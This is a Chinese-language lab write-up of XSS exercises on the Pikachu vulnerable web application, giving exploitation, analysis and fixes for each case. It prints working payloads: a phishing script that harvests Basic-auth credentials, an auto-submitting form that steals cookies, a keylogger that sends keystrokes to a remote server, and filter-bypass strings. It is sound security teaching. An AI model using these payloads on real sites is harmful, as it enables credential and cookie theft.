alt></p>\n<p>但是，可以发现，我们输入的内容会被输出到<code>&lt;a&gt;</code>标签的<code>href</code>属性中。因此我们可以使用伪协议<code>javascript</code>进行绕过。</p>\n<p>输入Payload：<code>javascript:alert(1)</code>,点击超链接，成功弹窗。</p>\n<p><strong>漏洞分析</strong></p>\n<p>后台确实对提交的数据进行了转义，但却没考虑到<code>href</code>属性可以使用伪协议执行JS。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322103254.png\" alt></p>\n<p><strong>漏洞修复</strong></p>\n<p>对输入的数据进行过滤，只允许http/https。</p>\n<p>对输出的数据进行转义，使用<code>htmlspecialchars($GET[&#39;message&#39;],ENT_QUOTES)</code>。</p>\n<h4 id=\"0x09-XSS之输出到JS\"><a href=\"#0x09-XSS之输出到JS\" class=\"headerlink\" title=\"0x09 XSS之输出到JS\"></a>0x09 XSS之输出到JS</h4><p><strong>漏洞挖掘</strong></p>\n<p>在页面输入内容，我们可以发现输入的数据会被输出在页面的JS代码之中，例如我们输入<code>whatever</code>：</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322104225.png\" alt></p>\n<p>那么，我们只需要考虑闭合，即可构造XSS，输入Payload：<code>&#39;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，成功弹窗。</p>\n<p><strong>漏洞分析</strong></p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322104702.png\" alt></p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322104739.png\" alt></p>\n<p><strong>漏洞修复</strong></p>\n<p>这里有一个问题，由于输出点是<code>&lt;script&gt;</code>标签中，而在该标签中的内容HTML解析器是不会进行解码的，因此不能使用<code>htmlspecialchars()</code>函数进行转义，否则JS代码将会因为无法被解码而无法正常执行。具体原理参考文章：<a href=\"https://sakuxa.com/2019/03/07/0x00-XSS%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8B%E8%A7%A3%E6%9E%90HTML%E6%96%87%E6%A1%A3/\">XSS学习系列Chapter 1：浏览器解析HTML文档</a></p>\n<p>所以解决方案应该是：在JS的输出点应该使用\\对特殊字符进行转义。</p>\n<h3 id=\"三、总结\"><a href=\"#三、总结\" class=\"headerlink\" title=\"三、总结\"></a>三、总结</h3><ul>\n<li>XSS漏洞会出现的点是复杂的、多种多样的。</li>\n<li>XSS漏洞的本质是用户提交的数据被当作JS代码执行，因此挖掘XSS漏洞就是要想方设法让输入的数据被执行。</li>\n<li>XSS漏洞的防范总体可以概括为“对输入进行过滤”和“对输出进行转义”，但是针对不同地方、不同功能点的防范方式及要考虑的方面也是不尽相同的。如0x08与0x09小节就是很好的例子。</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h3 id=\"一、前面的话\"><a href=\"#一、前面的话\" class=\"headerlink\" title=\"一、前面的话\"></a>一、前面的话</h3><h4 id=\"0x00-XSS可以分为如下几种常见类型\"><a href=\"#0x00-XSS可以分为如下几种常见类型\" class=\"headerlink\" title=\"0x00 XSS可以分为如下几种常见类型\"></a>0x00 XSS可以分为如下几种常见类型</h4><blockquote>\n<ul>\n<li>反射性XSS</li>\n<li>存储型XSS</li>\n<li>DOM型XSS</li>\n</ul>\n</blockquote>\n<h4 id=\"0x01-XSS漏洞的防范\"><a href=\"#0x01-XSS漏洞的防范\" class=\"headerlink\" title=\"0x01 XSS漏洞的防范\"></a>0x01 XSS漏洞的防范</h4><blockquote>\n<p>一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。</p>\n</blockquote>\n<ul>\n<li>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;</li>\n<li>输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</li>\n</ul>","more":"<h4 id=\"0x02-XSS过滤的简单绕过\"><a href=\"#0x02-XSS过滤的简单绕过\" class=\"headerlink\" title=\"0x02 XSS过滤的简单绕过\"></a>0x02 XSS过滤的简单绕过</h4><blockquote>\n<ul>\n<li>前端过滤绕过，抓包拦截改包即可。</li>\n<li>大小写绕过：<code>&lt;SciPt&gt;alert(1)&lt;/sCIpt&gt;</code>（JavaScript大小写敏感，但HTML大小写不敏感）</li>\n<li>双写绕过：<code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></li>\n<li>注释干扰：<code>&lt;scri&lt;!-- comment--&gt;pt&gt;alert(1)&lt;/sc&lt;!-- comment --&gt;ript&gt;</code></li>\n<li>编码绕过：注意前端编码解码机制。</li>\n</ul>\n</blockquote>\n<p>不同类型的XSS利用方式都差不多，目标是让其执行JS代码，因此在下面的例子中每个点只用一种漏洞利用方式。</p>\n<h3 id=\"二、XSS\"><a href=\"#二、XSS\" class=\"headerlink\" title=\"二、XSS\"></a>二、XSS</h3><h4 id=\"0x00-反射型XSS（GET）\"><a href=\"#0x00-反射型XSS（GET）\" class=\"headerlink\" title=\"0x00 反射型XSS（GET）\"></a>0x00 反射型XSS（GET）</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，是一个输入框。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321091305.png\" alt></p>\n<p>随意输入内容，点击submit。可以发现我们输入的内容会被以GET的形式提交到服务器，并且会被放到响应页面中返回。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321091552.png\" alt></p>\n<p>直接尝试最简单的测试Payload：<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>（输入框有长度限制，直接在URL里输入）。我们输入的数据被当作JS代码执行，成功弹窗。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321092149.png\" alt></p>\n<p><strong>漏洞利用(钓鱼攻击)</strong></p>\n<p>简单的重定向钓鱼：</p>\n<p>只需要将Payload改为：<code>&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</code>。</p>\n<p><code>http://www.evil.com</code>为要重定向到的地址，即钓鱼页面。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321093958.png\" alt></p>\n<p>接着诱导用户点击我们插入了Payload的链接，页面就会重定向到指定的钓鱼页面。</p>\n<p>Basic验证钓鱼：</p>\n<p>让用户访问我们插入了Payload的链接后，链接中的JS会被执行，执行结果就是请求fish.php，该文件会返回一个basic验证框。输入用户名密码后，会被发到我们的服务器。</p>\n<p>Payload：<code>&lt;script src=http://localhost/fish.php&gt;&lt;/script&gt;</code></p>\n<p>fish.php内容：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">// var_dump($_SERVER);</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ((!<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">'PHP_AUTH_USER'</span>])) || (!<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">'PHP_AUTH_PW'</span>]))) &#123;</span><br><span class=\"line\"><span class=\"comment\">//发送认证框，并给出迷惑性的info</span></span><br><span class=\"line\">    header(<span class=\"string\">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class=\"line\">    header(<span class=\"string\">\"WWW-Authenticate: Basic realm='认证'\"</span>);</span><br><span class=\"line\">    header(<span class=\"string\">'HTTP/1.0 401 Unauthorized'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Authorization Required.'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">'PHP_AUTH_USER'</span>])) &amp;&amp; (<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">'PHP_AUTH_PW'</span>])))&#123;</span><br><span class=\"line\"><span class=\"comment\">//将结果发送给搜集信息的后台,请将这里的IP地址修改为我们服务器的IP</span></span><br><span class=\"line\">    header(<span class=\"string\">\"Location: http://192.168.100.126/pkxss/xfish/xfish.php?username=&#123;$_SERVER[PHP_AUTH_USER]&#125;</span></span><br><span class=\"line\"><span class=\"string\">    &amp;password=&#123;$_SERVER[PHP_AUTH_PW]&#125;\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>诱导用户点击链接：<code>192.168.100.126/pikachu/vul/xss/xss_reflected_get.php?message=&lt;script src=http://localhost/fish.php&gt;&lt;/script&gt;&amp;submit=submit</code>，弹出验证框：</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321140505.png\" alt></p>\n<p>输入用户名密码点击确定后，我们服务器的访问日志中发现用户名密码：</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321140720.png\" alt></p>\n<p><strong>漏洞分析</strong></p>\n<p>用户在URL中提交的message参数的值会被服务器获取，然后未经任何过滤就拼接到字符串<code>$html</code>中。</p>\n<p>接着会在返回给用户的页面中直接输出打印<code>$html</code>变量。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321095133.png\" alt></p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321095226.png\" alt></p>\n<h4 id=\"0x01-反射型XSS（POST）\"><a href=\"#0x01-反射型XSS（POST）\" class=\"headerlink\" title=\"0x01 反射型XSS（POST）\"></a>0x01 反射型XSS（POST）</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，是一个登录页面，经过测试登录框不存在XSS，那么先进行登录，登录进去后会有一个输入框。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321113514.png\" alt></p>\n<p>在输入框中输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>进行测试。成功弹窗。</p>\n<p><strong>漏洞利用（窃取Cookie）</strong></p>\n<p>该漏洞类型属于POST型反射XSS，因为数据是通过POST方式提交的。</p>\n<p>POST方式提交数据导致我们不能像GET方式那样，在URL中插入Payload诱导用户点击即可完成攻击。</p>\n<p>POST型反射XSS漏洞利用（窃取Cookie）思路：</p>\n<p>实际上是CSRF配合XSS。</p>\n<p>在自己的服务器编写一个HTML文件，当访问该文件时，里面的JS会执行，执行效果是会自动提交POST数据。</p>\n<p>诱导用户点击我们编写的HTML文件的URL。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321115915.png\" alt></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">\t\t<span class=\"built_in\">window</span>.onload = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">  \t\t\t<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"postsubmit\"</span>).click();</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">\"post\"</span> <span class=\"attr\">action</span>=<span class=\"string\">\"http://192.168.100.26/pikachu/vul/xss/xsspost/xss_reflected_post.php\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">id</span>=<span class=\"string\">\"xssr_in\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"message\"</span> <span class=\"attr\">value</span>=</span></span><br><span class=\"line\">    \"&lt;script&gt;</span><br><span class=\"line\">\t\tdocument.location = 'http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>\" /&gt;</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">id</span>=<span class=\"string\">\"postsubmit\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"submit\"</span> /&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>查看服务器访问日志，发现Cookie被发回：</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321131526.png\" alt></p>\n<p><strong>漏洞分析</strong></p>\n<p>与GET方式的差别在于提交数据的方式不一样而已，其他都是一样的。</p>\n<h4 id=\"0x02-存储型XSS\"><a href=\"#0x02-存储型XSS\" class=\"headerlink\" title=\"0x02 存储型XSS\"></a>0x02 存储型XSS</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，是一个留言的功能页面，随意输入然后提交，留言内容会被存储到数据库，然后输出到页面上。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321132302.png\" alt></p>\n<p>输入<code>&lt;script&gt;alert(/xss/)&lt;/scipt&gt;</code>并提交，JS被成功执行并弹窗。</p>\n<p><strong>漏洞利用（键盘记录）</strong></p>\n<p>JS Payload文件：</p>\n<p>该JS文件作用是监听键盘记录，并将键盘记录通过AJAX请求发送到我们的服务器。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createAjax</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> request=<span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">window</span>.XMLHttpRequest)&#123;</span><br><span class=\"line\">        request=<span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(request.overrideMimeType)&#123;</span><br><span class=\"line\">            request.overrideMimeType(<span class=\"string\">\"text/xml\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"built_in\">window</span>.ActiveXObject)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">var</span> versions=[<span class=\"string\">'Microsoft.XMLHTTP'</span>, <span class=\"string\">'MSXML.XMLHTTP'</span>, <span class=\"string\">'Msxml2.XMLHTTP.7.0'</span>,<span class=\"string\">'Msxml2.XMLHTTP.6.0'</span>,<span class=\"string\">'Msxml2.XMLHTTP.5.0'</span>, <span class=\"string\">'Msxml2.XMLHTTP.4.0'</span>, <span class=\"string\">'MSXML2.XMLHTTP.3.0'</span>, <span class=\"string\">'MSXML2.XMLHTTP'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>; i&lt;versions.length; i++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                request=<span class=\"keyword\">new</span> ActiveXObject(versions[i]);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(request)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> request;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span>(e)&#123;</span><br><span class=\"line\">                request=<span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> request;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> ajax=<span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> xl=<span class=\"string\">\"datax=\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">onkeypress</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> realkey = <span class=\"built_in\">String</span>.fromCharCode(event.keyCode);</span><br><span class=\"line\">    xl+=realkey;</span><br><span class=\"line\">    show();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">document</span>.onkeypress = onkeypress;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    ajax = createAjax();</span><br><span class=\"line\">    ajax.onreadystatechange = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ajax.readyState == <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (ajax.status == <span class=\"number\">200</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> data = ajax.responseText;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                alert(<span class=\"string\">\"页面请求失败\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> postdate = xl;</span><br><span class=\"line\">    ajax.open(<span class=\"string\">\"POST\"</span>, <span class=\"string\">\"http://192.168.1.15/rserver.php\"</span>,<span class=\"literal\">true</span>);</span><br><span class=\"line\">    ajax.setRequestHeader(<span class=\"string\">\"Content-type\"</span>, <span class=\"string\">\"application/x-www-form-urlencoded\"</span>);</span><br><span class=\"line\">    ajax.setRequestHeader(<span class=\"string\">\"Content-length\"</span>, postdate.length);</span><br><span class=\"line\">    ajax.setRequestHeader(<span class=\"string\">\"Connection\"</span>, <span class=\"string\">\"close\"</span>);</span><br><span class=\"line\">    ajax.send(postdate);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>rserver.php</code>是我们服务器上用于接收键盘记录的页面。这里不能再使用任意URL然后看访问日志的方式。因为AJAX请求默认是受同源策略影响的，不能跨域进行请求。解决跨域请求的一个方法是，要请求的目标服务器在响应消息的头部中使用<code>Access-Control-Allow-Origin:xxx.com</code>来允许某些域可以发起跨域请求。</p>\n<p>由于我们的目的就是要让它跨域发起请求发到我们的服务器上，所以我们用于接收键盘记录的页面编写为：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//设置允许被任意域跨域访问</span></span><br><span class=\"line\">header(<span class=\"string\">\"Access-Control-Allow-Origin:*\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$data = $_POST[<span class=\"string\">'datax'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//保存到数据库</span></span><br><span class=\"line\">.......</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在留言处输入Payload<code>&lt;script src=http://192.168.100.126/evil.js&gt;&lt;/script&gt;</code>。之后在网页上按下的键都会被记录并发送到我们的接收页面。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321153844.png\" alt></p>\n<p><strong>漏洞分析</strong></p>\n<p>用户的留言提交到服务器后，服务器只进行了防SQLi的转义就直接保存到数据库中。访问留言页面时，会从数据库中把留言记录查询出来直接输出打印在页面中。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321154523.png\" alt></p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321154819.png\" alt></p>\n<h4 id=\"0x03-DOM-XSS-输入框\"><a href=\"#0x03-DOM-XSS-输入框\" class=\"headerlink\" title=\"0x03 DOM XSS(输入框)\"></a>0x03 DOM XSS(输入框)</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，有一个输入框，点击<code>Click me</code>，会出现一个<code>&lt;a&gt;</code>标签，猜测应该是JS操作DOM添加了一个标签。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321160027.png\" alt></p>\n<p>查看页面源代码，找到对应的JS，可以发现我们在输入框输入的数据会被直接拼接在<code>&lt;a&gt;</code>标签，然后将新创建的<code>&lt;a&gt;</code>标签直接插入HTML中：</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321160530.png\" alt></p>\n<p>我们只要考虑闭合就可以随意插入JS代码。</p>\n<p>在输入框输入：<code>#&#39; onmouseover=&quot;alert(/xss/)&quot;&gt;</code>，鼠标移动到<code>&lt;a&gt;</code>标签上，成功弹窗。</p>\n<p>该漏洞比较鸡肋。</p>\n<h4 id=\"0x04-DOM-XSS（URL）\"><a href=\"#0x04-DOM-XSS（URL）\" class=\"headerlink\" title=\"0x04 DOM XSS（URL）\"></a>0x04 DOM XSS（URL）</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面后，操作与上一节一样，直接查看源代码，找到对应的JS。</p>\n<p>由JS代码可知我们可以在URL中的text参数构造payload，然后点击页面的<code>&lt;a&gt;</code>标签，我们的payload就会被插入到HTML中。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190321162028.png\" alt></p>\n<p>构造text参数的值为：<code>&#39; onclick=&quot;alert(/xss/)&quot;&gt;</code></p>\n<p>先点击<code>有些事费尽心思.......</code></p>\n<p>再点击<code>就让往事都随风......</code></p>\n<p><strong>漏洞利用</strong></p>\n<p>该漏洞相对于上一节的DOM XSS漏洞要有危害得多，因为诱导用户点击链接就能完成攻击。</p>\n<p>漏洞利用参照前面几节，都是差不多的。</p>\n<h4 id=\"0x05-XSS盲打\"><a href=\"#0x05-XSS盲打\" class=\"headerlink\" title=\"0x05 XSS盲打\"></a>0x05 XSS盲打</h4><p>XSS盲打是指输入的数据不确定会被输出到哪个页面，只能尝试性使用Payload。</p>\n<p>XSS Blind 本质上也是存储型的XSS。</p>\n<p><strong>漏洞挖掘</strong></p>\n<p>打开页面，有输入框需要输入数据。输入的数据会被提交到服务器中，但是我们并不能确定我们输入的数据会被输出在哪个页面。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322090316.png\" alt></p>\n<p>输入简单的payload测试：<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322090957.png\" alt></p>\n<p>在本例中，我们输入的数据会被保存到数据库，然后输出在管理员后台页面中，当我们插入xss的payload，管理员登录后台管理时就会被攻击，危害相当大。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322091345.png\" alt></p>\n<p><strong>漏洞分析</strong></p>\n<p>我们输入的数据未经过任何过滤处理就会被直接保存在服务器中。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322091944.png\" alt></p>\n<p>后台页面会从数据库中读取数据，输出到页面。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322092322.png\" alt></p>\n<h4 id=\"0x06-简单XSS过滤绕过\"><a href=\"#0x06-简单XSS过滤绕过\" class=\"headerlink\" title=\"0x06 简单XSS过滤绕过\"></a>0x06 简单XSS过滤绕过</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，有一个输入框，输入一个XSS探针Payload来检测是否做了过滤，对什么做了过滤，XSS探针：</p>\n<blockquote>\n<p><code>&quot;&#39;&lt;script javascript onload src&gt;&lt;a href&gt;&lt;/a&gt;#$%^</code></p>\n</blockquote>\n<p>输入探针后点击提交，然后查看页面源代码，确定过滤，发现<code>&lt;</code>、<code>script</code>、<code>javascript</code>直接被过滤了。但是其他并没有被过滤。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322094644.png\" alt></p>\n<p>使用<code>&lt;a&gt;</code>标签、<code>&lt;img&gt;</code>标签就可以绕过过滤。使用Payload：<code>&lt;img src=x onerror=alert(1)&gt;</code>，成功弹窗。</p>\n<p><strong>漏洞分析</strong></p>\n<p>采用了正则进行过滤，我们除了可以使用<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code>登其他标签之外，还可以使用大写的<code>script</code>标签绕过。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322095504.png\" alt></p>\n<h4 id=\"0x07-XSS-htmlspecialchars-过滤绕过\"><a href=\"#0x07-XSS-htmlspecialchars-过滤绕过\" class=\"headerlink\" title=\"0x07 XSS htmlspecialchars()过滤绕过\"></a>0x07 XSS htmlspecialchars()过滤绕过</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面时一个登录框，继续同上一节的操作，插入XSS探针然后查看页面源代码，可以看到一些特殊字符被实体编码了：</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322100707.png\" alt></p>\n<p>但可以注意到单引号并没有被转义，因此可以使用Payload：<code>&#39; onmouseover=alert(1) &#39;</code></p>\n<p><strong>漏洞分析</strong></p>\n<p>分析源代码可知，后端使用<code>htmlspecialchars()</code>函数对用户的提交的数据进行了转义：</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322101307.png\" 